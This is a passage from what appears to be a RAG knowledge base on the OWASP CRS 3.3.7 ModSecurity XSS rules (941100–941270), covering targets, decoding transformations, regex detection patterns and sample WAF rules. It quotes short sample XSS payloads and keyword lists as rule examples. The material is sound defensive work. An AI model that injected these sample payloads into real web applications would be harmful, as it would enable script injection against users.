# OWASP CRS 3.3.7 ModSecurity XSS Rules Knowledge Base for RAG and WAF Rule Generation
# 1. CRS REQUEST-941 XSS Rule Group Overview
## 1.1 Rule Group Identity

The source rule group is:

```text
OWASP ModSecurity Core Rule Set 3.3.7
REQUEST-941-APPLICATION-ATTACK-XSS
```

This rule group detects XSS payload families in request data using ModSecurity `SecRule` directives.

Primary attack type:

```text
XSS
Cross-Site Scripting
HTML injection
JavaScript URI injection
Event-handler injection
Attribute injection
Template injection
Encoding-based XSS evasion
JavaScript obfuscation
```

## 1.2 Rule Group Purpose

The CRS 941 rule group detects XSS through:

- libinjection XSS detection
- script tag detection
- event handler detection
- HTML attribute and URI scheme detection
- JavaScript URI detection
- NoScript-derived HTML and attribute injection patterns
- Node-Validator blacklist keyword patterns
- IE XSS filter-derived patterns
- malformed encoding patterns
- UTF-7 and US-ASCII XSS evasion patterns
- JSFuck / Hieroglyphy obfuscation patterns
- JavaScript global-variable bypass patterns
- AngularJS client-side template injection patterns

## 1.3 CRS Rule Generation Principle

When generating a ModSecurity rule from this knowledge base:

1. Choose a target based on payload location.
2. Use a detection operator appropriate to the XSS family:
   - `@detectXSS` for libinjection-style detection
   - `@rx` for regex pattern families
   - `@pm` for phrase-list keyword detection
3. Use `t:none` first.
4. Add decoding transformations before matching:
   - `t:utf8toUnicode`
   - `t:urlDecodeUni`
   - `t:htmlEntityDecode`
   - `t:jsDecode`
   - `t:cssDecode`
   - `t:removeNulls`
5. Use `capture` when the matched substring should be logged via `%{TX.0}`.
6. Use `block` for CRS anomaly-scoring rules.
7. Add CRS-style metadata:
   - `id`
   - `phase`
   - `msg`
   - `logdata`
   - `tag`
   - `ctl:auditLogParts=+E`
   - `ver`
   - `severity`
   - `setvar`
8. Increment `tx.xss_score` and the correct paranoia-level anomaly score.
9. Tune false positives using target exclusions such as `!ARGS:param` or `!REQUEST_COOKIES:/regex/`.

---

# 2. CRS Paranoia Level Gates

## 2.1 Paranoia Level Model

CRS uses paranoia levels to control rule strictness.

Higher paranoia levels enable stricter rules and increase false-positive risk.

In this rule group:

| Paranoia level | Behavior |
|---|---|
| PL1 | Default baseline XSS detection. |
| PL2 | Stricter XSS detection, including Referer checks and broader HTML tag / attribute patterns. |
| PL3 | No additional XSS rules are shown in the uploaded file segment, but skip markers exist. |
| PL4 | No additional XSS rules are shown in the uploaded file segment, but skip markers exist. |

## 2.2 PL0 / PL1 Skip Gates

The rule group starts with unconditional skip gates for environments where the executing paranoia level is below 1.

```apache
SecRule TX:EXECUTING_PARANOIA_LEVEL "@lt 1" "id:941011,phase:1,pass,nolog,skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
SecRule TX:EXECUTING_PARANOIA_LEVEL "@lt 1" "id:941012,phase:2,pass,nolog,skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
```

Meaning:

- If `TX:EXECUTING_PARANOIA_LEVEL` is lower than `1`, skip the rest of the 941 XSS rules.
- `skipAfter` jumps to the marker:

```apache
SecMarker "END-REQUEST-941-APPLICATION-ATTACK-XSS"
```

## 2.3 PL2 Skip Gates

Before PL2 rules, the file adds:

```apache
SecRule TX:EXECUTING_PARANOIA_LEVEL "@lt 2" "id:941013,phase:1,pass,nolog,skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
SecRule TX:EXECUTING_PARANOIA_LEVEL "@lt 2" "id:941014,phase:2,pass,nolog,skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
```

Meaning:

- If executing paranoia level is below `2`, skip PL2 rules.
- PL2 rules should not run at PL1.

## 2.4 PL3 and PL4 Skip Gates

The uploaded file includes PL3 and PL4 gates:

```apache
SecRule TX:EXECUTING_PARANOIA_LEVEL "@lt 3" "id:941015,phase:1,pass,nolog,skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
SecRule TX:EXECUTING_PARANOIA_LEVEL "@lt 3" "id:941016,phase:2,pass,nolog,skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"

SecRule TX:EXECUTING_PARANOIA_LEVEL "@lt 4" "id:941017,phase:1,pass,nolog,skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
SecRule TX:EXECUTING_PARANOIA_LEVEL "@lt 4" "id:941018,phase:2,pass,nolog,skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
```

The loaded file segment does not include additional PL3 or PL4 XSS detection rules after these gates.

## 2.5 Rule-Generation Guidance for Paranoia Levels

When generating CRS-style ModSecurity rules:

- Use PL1 for high-confidence, lower-false-positive XSS indicators.
- Use PL2 for stricter patterns such as broad tag or attribute injection detection.
- Use PL3 or PL4 only when the rule is intentionally aggressive.
- Add the correct tag:

```apache
tag:'paranoia-level/1'
```

or:

```apache
tag:'paranoia-level/2'
```

- Increment the matching PL anomaly score:

```apache
setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'
```

or:

```apache
setvar:'tx.anomaly_score_pl2=+%{tx.critical_anomaly_score}'
```

---

# 3. CRS XSS Target Variables

## 3.1 Primary PL1 Target Set

Most PL1 XSS rules inspect this broad target set:

```apache
REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|ARGS_NAMES|ARGS|XML:/*
```

Meaning:

| Target | Purpose |
|---|---|
| `REQUEST_COOKIES` | Inspect cookie values. |
| `!REQUEST_COOKIES:/__utm/` | Exclude analytics cookies whose names match `__utm`. |
| `REQUEST_COOKIES_NAMES` | Inspect cookie names. |
| `REQUEST_HEADERS:User-Agent` | Inspect User-Agent header. |
| `ARGS_NAMES` | Inspect request argument names. |
| `ARGS` | Inspect all request argument values. |
| `XML:/*` | Inspect XML values when XML parsing applies. |

## 3.2 PL1 Target Set with Referer

Some rules include `REQUEST_HEADERS:Referer`:

```apache
REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|REQUEST_HEADERS:Referer|ARGS_NAMES|ARGS|XML:/*
```

Use this when the XSS vector may appear in Referer or when following the CRS rule pattern that includes Referer.

## 3.3 Stricter Referer-Only PL2 Target

Rule `941101` applies libinjection XSS detection to Referer at PL2:

```apache
REQUEST_HEADERS:Referer
```

Use this as a stricter signal because Referer may contain URLs, fragments, and external content that can create false positives.

## 3.4 Target Set with Additional Cookie Exclusion

Rules `941320`, `941330`, and `941340` use an additional cookie exclusion:

```apache
REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|!REQUEST_COOKIES:/_pk_ref/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/*
```

Meaning:

- Exclude `__utm` analytics cookies.
- Exclude `_pk_ref` analytics/referrer cookies.
- Keep inspecting cookie names, argument names, argument values, and XML.

## 3.5 Target Selection for Generated Rules

| Observed XSS location | Recommended ModSecurity target |
|---|---|
| Any parameter value | `ARGS` |
| Query/form parameter name | `ARGS_NAMES` |
| Specific parameter | `ARGS:param_name` |
| Cookie value | `REQUEST_COOKIES` |
| Specific cookie | `REQUEST_COOKIES:cookie_name` |
| Cookie names | `REQUEST_COOKIES_NAMES` |
| User-Agent | `REQUEST_HEADERS:User-Agent` |
| Referer | `REQUEST_HEADERS:Referer` |
| Any request header | `REQUEST_HEADERS` |
| XML body | `XML:/*` |
| URI path | `REQUEST_FILENAME` |
| Full URI | `REQUEST_URI` |
| Request body | `REQUEST_BODY` or parsed variables if enabled |

## 3.6 Target Tuning Rule

If a generated XSS rule is too broad, tune it by narrowing or excluding targets.

Example broad CRS-style target:

```apache
REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|ARGS_NAMES|ARGS|XML:/*
```

Example tuned target excluding a rich-text field:

```apache
ARGS|!ARGS:content
```

Example tuned target for one vulnerable parameter:

```apache
ARGS:q
```

---

# 4. CRS XSS Transformation Pipelines

## 4.1 Standard CRS XSS Decode Pipeline

Many CRS 941 XSS rules use this transformation stack:

```apache
t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls
```

Purpose:

| Transformation | Why CRS uses it for XSS |
|---|---|
| `t:none` | Clears inherited transformations. |
| `t:utf8toUnicode` | Normalizes UTF-8 sequences into Unicode representation. |
| `t:urlDecodeUni` | Decodes URL encoding and Microsoft `%uXXXX` encoding. |
| `t:htmlEntityDecode` | Decodes HTML entities such as `&lt;`, `&#x3c;`, and `&#60;`. |
| `t:jsDecode` | Decodes JavaScript escapes such as `\x3c` and `\u003c`. |
| `t:cssDecode` | Decodes CSS escape sequences used in style-context XSS. |
| `t:removeNulls` | Removes null bytes used for evasion. |

## 4.2 Standard CRS XSS Decode Pipeline with Lowercase

Rule `941180` adds `t:lowercase` before `t:removeNulls`:

```apache
t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls
```

Use lowercase when matching phrase lists or case-sensitive keyword sets.

## 4.3 US-ASCII Malformed Encoding Pipeline

Rule `941310` uses:

```apache
t:none,t:urlDecodeUni,t:lowercase,t:urlDecode,t:htmlEntityDecode,t:jsDecode
```

Use when detecting malformed encoding and legacy browser/server interpretation issues.

## 4.4 UTF-7 Pipeline

Rule `941350` uses:

```apache
t:none,t:urlDecodeUni,t:urlDecode,t:htmlEntityDecode,t:jsDecode
```

Use for UTF-7-style XSS payload patterns such as:

```text
+ADw-script+AD4-
```

## 4.5 JSFuck / Hieroglyphy Pipeline

Rule `941360` uses:

```apache
t:none
```

Reason:

- JSFuck patterns such as `!![]`, `!+[]`, and `! []` are syntax-sensitive.
- Excessive transformations can hide or alter the exact obfuscation structure.
- CRS notes that ModSecurity transforms `+` into a space in query strings and URLENCODE body processing, but not for JSON.

## 4.6 JavaScript Global Variable Bypass Pipeline

Rule `941370` uses:

```apache
t:none,t:urlDecodeUni,t:compressWhitespace
```

Reason:

- It detects patterns using globals such as `self`, `document`, `this`, `top`, and `window`.
- URL decoding exposes encoded brackets and comment tokens.
- Whitespace compression makes comment/bracket spacing easier to match.

## 4.7 AngularJS Template Injection Pipeline

Rule `941380` uses:

```apache
t:none
```

Reason:

- The detection pattern is the literal template expression shape:

```text
{{...}}
```

- Additional transformations are not necessary for this exact detection.

## 4.8 Transformation Selection Matrix for Generated XSS Rules

| XSS bypass technique | Recommended transformations |
|---|---|
| Mixed case | `t:lowercase` or regex `(?i)` |
| URL encoding | `t:urlDecodeUni` |
| HTML entity encoding | `t:htmlEntityDecode` |
| JavaScript escape encoding | `t:jsDecode` |
| CSS escape encoding | `t:cssDecode` |
| UTF-8 / Unicode normalization | `t:utf8toUnicode` plus `t:urlDecodeUni` |
| Null byte evasion | `t:removeNulls` |
| Whitespace obfuscation | `t:compressWhitespace` or regex whitespace handling |
| US-ASCII malformed encoding | `t:urlDecodeUni,t:lowercase,t:urlDecode,t:htmlEntityDecode,t:jsDecode` |
| UTF-7 | `t:urlDecodeUni,t:urlDecode,t:htmlEntityDecode,t:jsDecode` |
| JSFuck exact syntax | `t:none` |
| AngularJS template delimiter | `t:none` |

---

# 5. CRS XSS Action and Metadata Pattern

## 5.1 Common CRS XSS Action Block

Most CRS XSS rules use an action block with this structure:

```apache
"id:<RULE_ID>,\
phase:2,\
block,\
capture,\
t:none,<TRANSFORMATIONS>,\
msg:'<MESSAGE>',\
logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
tag:'application-multi',\
tag:'language-multi',\
tag:'platform-multi',\
tag:'attack-xss',\
tag:'paranoia-level/<PL>',\
tag:'OWASP_CRS',\
tag:'capec/1000/152/242',\
ctl:auditLogParts=+E,\
ver:'OWASP_CRS/3.3.7',\
severity:'CRITICAL',\
setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',\
setvar:'tx.anomaly_score_pl<PL>=+%{tx.critical_anomaly_score}'"
```

## 5.2 Required CRS-Style Metadata for Generated Rules

| Field/action | Purpose |
|---|---|
| `id` | Unique rule ID. |
| `phase:2` | Request body / argument phase; most XSS CRS rules run here. |
| `block` | Let CRS blocking evaluation enforce according to anomaly scoring mode. |
| `capture` | Store matched regex data in `TX.0` for logging. |
| `t:none` | Clear inherited transformations. |
| `msg` | Human-readable rule message. |
| `logdata` | Include matched data and matched variable name/value. |
| `tag:'attack-xss'` | Classify the rule as XSS. |
| `tag:'paranoia-level/N'` | Declare PL classification. |
| `tag:'OWASP_CRS'` | Mark CRS compatibility. |
| `severity:'CRITICAL'` | Critical severity, default anomaly score usually 5. |
| `setvar:'tx.xss_score=+...'` | Increment XSS-specific score. |
| `setvar:'tx.anomaly_score_plN=+...'` | Increment PL-specific anomaly score. |

## 5.3 Logdata Patterns

For rules with `capture`, use:

```apache
logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}'
```

For rules without capture or when only the variable is needed, use:

```apache
logdata:'Matched Data: Suspicious payload found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}'
```

## 5.4 Action Guidance for Generated Rules

- Use `block` for CRS-compatible anomaly scoring rules.
- Use `deny,status:403` for standalone immediate-block custom rules outside CRS anomaly scoring.
- Use `pass,log,auditlog` for monitoring-only validation rules.
- Use `setvar` when integrating with CRS anomaly scoring.
- Use `capture` when the operator is `@rx` and the matched fragment is useful for logs.
- Avoid exposing sensitive or full payload content in logs if privacy constraints apply.

---

# 6. Rule 941100: Libinjection XSS Detection

## 6.1 Rule Identity

```text
Rule ID: 941100
Paranoia level: PL1
Category: Libinjection XSS Detection
Operator: @detectXSS
Attack type: XSS
```

## 6.2 Rule Purpose

Rule `941100` uses libinjection to detect XSS attack patterns in common request inputs.

## 6.3 Target Set

```apache
REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|ARGS_NAMES|ARGS|XML:/*
```

## 6.4 Core Rule Pattern

```apache
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|ARGS_NAMES|ARGS|XML:/* "@detectXSS" \
    "id:941100,\
    phase:2,\
    block,\
    t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,\
    msg:'XSS Attack Detected via libinjection',\
    tag:'attack-xss',\
    tag:'paranoia-level/1',\
    severity:'CRITICAL',\
    setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
```

## 6.5 Rule-Generation Use

Use this pattern when:

- the goal is broad generic XSS detection
- libinjection support is available
- the input may contain many XSS variants
- the rule should be CRS-style rather than one-off literal matching

Do not rely only on this rule for all XSS. CRS pairs libinjection with regex and phrase-based rules for coverage.

---

# 7. Rule 941110: XSS Category 1 Script Tag Vector

## 7.1 Rule Identity

```text
Rule ID: 941110
Paranoia level: PL1
Category: XSS Filter Category 1
Vector: Script tag XSS
Operator: @rx
```

## 7.2 Detection Intent

Detect script tag based XSS vectors such as:

```html
<script>alert(1)</script>
```

## 7.3 Core Pattern

```apache
@rx (?i)<script[^>]*>[\s\S]*?
```

Meaning:

- `(?i)` makes the regex case-insensitive.
- `<script` detects script tag start.
- `[^>]*>` allows attributes or content before the closing `>`.
- `[\s\S]*?` allows content across whitespace and newline characters.

## 7.4 CRS Rule Pattern

```apache
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|REQUEST_HEADERS:User-Agent|REQUEST_HEADERS:Referer|ARGS_NAMES|ARGS|XML:/* "@rx (?i)<script[^>]*>[\s\S]*?" \
    "id:941110,\
    phase:2,\
    block,\
    capture,\
    t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,\
    msg:'XSS Filter - Category 1: Script Tag Vector',\
    tag:'attack-xss',\
    tag:'paranoia-level/1',\
    severity:'CRITICAL',\
    setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
```

## 7.5 Rule-Generation Use

Use this rule concept when payloads contain:

```text
<script>
<SCRIPT>
<script src=...>
<script>alert(1)</script>
```

For a narrower custom rule, target only the vulnerable parameter:

```apache
SecRule ARGS:q "@rx (?i)<script[^>]*>[\s\S]*?" \
  "id:100941110,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Script tag XSS detected in q parameter'"
```

---

# 8. Rule 941120: XSS Category 2 Event Handler Vector

## 8.1 Rule Identity

```text
Rule ID: 941120
Paranoia level: PL1
Category: XSS Filter Category 2
Vector: Event handler injection
Operator: @rx
```

## 8.2 Detection Intent

Detect XSS vectors using HTML event handlers such as:

```html
<body onload="alert(1)">
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

## 8.3 Core Pattern

```apache
@rx (?i)[\s"'`;\/0-9=\x0B\x09\x0C\x3B\x2C\x28\x3B]on[a-zA-Z]+[\s\x0B\x09\x0C\x3B\x2C\x28\x3B]*?=
```

Meaning:

- Requires context before the event handler such as whitespace, quote, slash, digit, equals, or delimiter.
- Detects `on` followed by letters, such as `onerror`, `onload`, `onclick`, `onmouseover`.
- Allows whitespace and delimiter obfuscation before `=`.

## 8.4 Rule-Generation Use

Use this rule concept when payloads contain:

```text
onerror=
onload=
onclick=
onmouseover=
```

A compact generated rule:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)[\s\"'`;\/0-9=]on[a-z]+[\s;,\(]*?=" \
  "id:100941120,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'XSS event handler detected'"
```

---

# 9. Rule 941130: XSS Category 3 Attribute Vector

## 9.1 Rule Identity

```text
Rule ID: 941130
Paranoia level: PL1
Category: XSS Filter Category 3
Vector: Attribute vector
Operator: @rx
Source note: regex generated from regexp-941130.data using regexp-assemble
```

## 9.2 Detection Intent

Detect XSS-related attributes, namespace tricks, XML/HTML vectors, and data URI indicators.

Core semantic indicators include:

```text
!ENTITY
PUBLIC
SYSTEM
xlink:href
xhtml
xmlns
data:text/html
pattern=
formaction
@import
;base64
```

## 9.3 Core Pattern Family

```apache
@rx (?i)[\s\S](?:!ENTITY\s+(?:\S+|%\s+\S+)\s+(?:PUBLIC|SYSTEM)|x(?:link:href|html|mlns)|data:text\/html|pattern\b.*?=|formaction|\@import|;base64)\b
```

## 9.4 Rule-Generation Use

Use this rule concept when payloads contain:

```text
xlink:href
data:text/html
formaction=
@import
;base64
```

Example custom rule:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)(xlink:href|data:text/html|formaction\s*=|@import|;base64)" \
  "id:100941130,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'XSS attribute vector detected'"
```

---

# 10. Rule 941140: XSS Category 4 JavaScript URI Vector

## 10.1 Rule Identity

```text
Rule ID: 941140
Paranoia level: PL1
Category: XSS Filter Category 4
Vector: JavaScript URI and dangerous tags
Operator: @rx
```

## 10.2 Detection Intent

Detect JavaScript URI vectors in tags and attributes, such as:

```html
<p style="background:url(javascript:alert(1))">
<a href="javascript:alert(1)">
<img src="javascript:alert(1)">
```

## 10.3 Core Pattern Family

Rule `941140` detects:

- dangerous tags such as `applet`, `object`, `isindex`, `embed`, `style`, `form`, and `meta`
- `URL(...)` style expressions
- obfuscated `SCRIPT:` with spaces between characters

Important pattern concept:

```text
S C R I P T :
```

with optional whitespace between letters.

## 10.4 Rule-Generation Use

Use this rule concept when payloads contain:

```text
javascript:
vbscript:
url(javascript:
data:text/html
```

Example custom rule:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)(javascript\s*:|vbscript\s*:|url\s*\(\s*javascript\s*:|data:text/html)" \
  "id:100941140,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'XSS JavaScript URI vector detected'"
```

---

# 11. Rule 941160: NoScript HTML Injection

## 11.1 Rule Identity

```text
Rule ID: 941160
Paranoia level: PL1
Category: NoScript XSS InjectionChecker
Vector: HTML injection
Operator: @rx
Source note: regex generated from regexp-941160.data using regexp-assemble
```

## 11.2 Detection Intent

Rule `941160` is a large assembled regex derived from NoScript InjectionChecker patterns. It detects broad HTML injection including:

- HTML event handlers
- SVG event handlers
- DOM events
- media events
- touch/mouse/keyboard events
- attributes such as `style`, `src`, `background`, `formaction`, `lowsrc`, and `ping`
- dangerous tags with obfuscation between letters
- non-word separators inside tag names
- dangerous elements such as script, iframe, object, embed, svg, style, form, meta, applet, audio, video, link, param

## 11.3 Important Detection Families

The rule detects event-handler attributes ending with `=`:

```text
onload=
onerror=
onclick=
onmouseover=
onreadystatechange=
onanimationstart=
ontouchstart=
onkeydown=
```

The rule also detects dangerous attributes:

```text
style=
src=
background=
formaction=
lowsrc=
ping=
```

The rule detects dangerous obfuscated tag names including:

```text
script
style
svg
set
meta
form
iframe
frame
object
embed
param
video
audio
image
img
applet
base
body
binding
marquee
link
```

## 11.4 Rule-Generation Use

Use this rule concept when payloads are broad HTML injection rather than a single stable token.

Generated rule should usually be narrower than CRS `941160` unless explicitly recreating CRS behavior.

Example generated rule:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)(on[a-z]+\s*=|(?:style|src|background|formaction|lowsrc|ping)\s*=|<\s*(script|iframe|object|embed|svg|style|form|meta|applet|link)\b)" \
  "id:100941160,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'HTML injection XSS vector detected'"
```

## 11.5 False-Positive Risk

This rule family is broad. It can false positive on:

- CMS rich-text editors
- HTML documentation
- Markdown preview fields
- page builders
- email template editors
- admin interfaces that legitimately accept HTML

Tuning patterns:

```apache
ARGS|!ARGS:content
```

```apache
ARGS:comment
```

```apache
REQUEST_HEADERS:User-Agent
```

---

# 12. Rule 941170: NoScript Attribute Injection

## 12.1 Rule Identity

```text
Rule ID: 941170
Paranoia level: PL1
Category: NoScript InjectionChecker
Vector: Attribute injection
Operator: @rx
```

## 12.2 Detection Intent

Detect dangerous attribute values and CSS/script inclusion patterns.

Important pattern families:

```text
javascript:
data:
base64
charset=
@import
url(
-moz-binding
```

The rule catches obfuscation where characters in `import`, `url`, and `binding` are separated by non-word characters.

## 12.3 Rule-Generation Use

Use when payload contains:

```text
href=javascript:
src=data:
style=@import
-moz-binding
data:text/html;base64
```

Example generated rule:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)(javascript\s*:|data\s*:.*?(base64|charset=)|@\W*i\W*m\W*p\W*o\W*r\W*t|-moz-binding|url\s*\()" \
  "id:100941170,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'XSS attribute injection vector detected'"
```

---

# 13. Rule 941180: Node-Validator Blacklist Keywords

## 13.1 Rule Identity

```text
Rule ID: 941180
Paranoia level: PL1
Category: Node-Validator blacklist keywords
Operator: @pm
```

## 13.2 Detection Intent

Detect phrase-list keywords commonly associated with XSS and DOM manipulation.

Phrase list:

```text
document.cookie
document.write
.parentnode
.innerhtml
window.location
-moz-binding
<!--
-->
<![cdata[
```

## 13.3 Core Rule Pattern

```apache
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "@pm document.cookie document.write .parentnode .innerhtml window.location -moz-binding <!-- --> <![cdata[" \
    "id:941180,\
    phase:2,\
    block,\
    capture,\
    t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls,\
    msg:'Node-Validator Blacklist Keywords',\
    tag:'attack-xss',\
    tag:'paranoia-level/1',\
    severity:'CRITICAL'"
```

## 13.4 Rule-Generation Use

Use phrase matching when the suspicious indicators are stable literal strings.

Example generated rule:

```apache
SecRule ARGS|REQUEST_COOKIES|REQUEST_HEADERS "@pm document.cookie document.write .innerhtml window.location -moz-binding" \
  "id:100941180,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls,deny,status:403,log,msg:'XSS DOM keyword detected'"
```

## 13.5 False-Positive Risk

This rule family can false positive on:

- JavaScript documentation
- developer tools
- code snippets
- admin pages that accept JS
- bug bounty reports
- CMS content editing

Tune by targeting specific input fields or excluding code/documentation fields.

---

# 14. IE XSS Filter-Derived Rules 941190 to 941300

## 14.1 Rule Family Identity

```text
Rule IDs: 941190, 941200, 941210, 941220, 941230, 941240, 941250, 941260, 941270, 941280, 941290, 941300
Category: IE XSS Filters
Paranoia level: PL1
Operator: @rx
```

## 14.2 Rule 941190: STYLE Import / Expression Pattern

Detects style blocks that use import-like or expression-like syntax.

Pattern family:

```text
<style ... @i
<style ... \ 
<style ... :
<style ... =
```

Rule-generation use:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)<style.*?(?:@import|expression\s*\(|url\s*\(|[:=])" \
  "id:100941190,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Style-based XSS vector detected'"
```

## 14.3 Rule 941200: VML Frame Source

Detects VML frame source patterns:

```text
<vmlframe ... src=
```

Rule-generation use:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)<.*[:]?vmlframe.*?[\s/+]*?src[\s/+]*=" \
  "id:100941200,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'VML frame XSS vector detected'"
```

## 14.4 Rule 941210: Obfuscated `javascript:` Scheme

Detects `javascript:` where each character can be represented directly or through HTML entities and separated by tab/newline entities.

Semantic target:

```text
javascript:
j a v a s c r i p t :
j&#x61;vascript:
java&#x0A;script:
```

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)j\s*a\s*v\s*a\s*s\s*c\s*r\s*i\s*p\s*t\s*:" \
  "id:100941210,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Obfuscated javascript URI scheme detected'"
```

## 14.5 Rule 941220: Obfuscated `vbscript:` Scheme

Detects `vbscript:` with entity and whitespace obfuscation.

Semantic target:

```text
vbscript:
v b s c r i p t :
```

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)v\s*b\s*s\s*c\s*r\s*i\s*p\s*t\s*:" \
  "id:100941220,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Obfuscated vbscript URI scheme detected'"
```

## 14.6 Rule 941230: EMBED Source or Type

Detects:

```html
<EMBED src=...
<EMBED type=...
```

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)<embed[\s/+].*?(?:src|type).*?=" \
  "id:100941230,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'Embed tag XSS vector detected'"
```

## 14.7 Rule 941240: Import Implementation

Detects:

```text
<?import ... implementation=
```

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx <[?]?import[\s\/+\S]*?implementation[\s\/+]*?=" \
  "id:100941240,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls,deny,status:403,log,msg:'Import implementation XSS vector detected'"
```

## 14.8 Rule 941250: META HTTP-EQUIV Refresh / Content / Set-Cookie

Detects META tags with suspicious `http-equiv` values related to refresh/content/script-like behavior.

Semantic target:

```html
<meta http-equiv="refresh" content="0;url=javascript:...">
<meta http-equiv="Set-Cookie" content="...">
```

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)<meta[\s/+].*?http-equiv[\s/+]*=" \
  "id:100941250,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'META http-equiv XSS vector detected'"
```

## 14.9 Rule 941260: META Charset

Detects:

```html
<meta charset=...>
```

and similar META charset definitions that can participate in encoding-based browser interpretation issues.

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)<meta[\s/+].*?charset[\s/+]*=" \
  "id:100941260,phase:2,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,deny,status:403,log,msg:'META charset XSS vector detected'"
```

## 14.10 Rule 941270: LINK HREF

Detects:

```html
<link href=...>
```

Generated rule concept:

```apache
SecRule ARGS|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?i)<link[\s/+].*?href[\s/+]*=" \
